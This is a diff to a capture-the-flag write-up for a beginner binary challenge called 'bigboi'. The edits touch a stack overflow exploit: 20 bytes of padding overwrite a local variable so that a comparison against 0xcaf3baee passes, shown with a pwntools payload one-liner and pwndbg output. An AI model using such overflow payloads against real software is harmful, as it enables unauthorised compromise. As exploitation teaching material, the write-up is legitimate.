@@ -1,4 +1,3 @@
-
 # bigboi
 
 ## Enumeration
@@ -41,32 +40,32 @@ undefined8 main(void)
 
 ## Manual Exploitation
 
-**20** Bytes of padding allows us to change over `0xdeadbeef` to `0xcafebaee`. 
+**20** Bytes of padding allows us to change `0xdeadbeef` to `0xcaf3baee`. 
 
 ```bash
 python3 -c 'import pwn;print(b"A"*20 + pwn.p32(0xcaf3baee))' > payload
 ```
 
-Check comparison is at main+103
-
+Check comparison is at `main+103`.
+`
 ```
 pwndbg> disassemble main
    ...
    0x00000000004006a5 <+100>:   mov    eax,DWORD PTR [rbp-0x1c]
    0x00000000004006a8 <+103>:   cmp    eax,0xcaf3baee
    ...
+   
 pwndbg> b *(main+103)
 Breakpoint 1 at 0x4006a8
 ```
 
-Running with the payload as input clobbers the area as expected
+Running with the payload as input clobbers the area as expected and skip the `jne`.
 
 ```
 pwndbg> r < payload
-```
-```
 ...
- ► 0x4006a8 <main+103>    cmp    eax, 0xcaf3baee     0xcaf3baee - 0xcaf3baee    
+ ► 0x4006a8 <main+103>    cmp    eax, 0xcaf3baee     0xcaf3baee - 0xcaf3baee
+   0x4006ad <main+108>    jne    main+122                    <main+122>
 ...
 ```
 
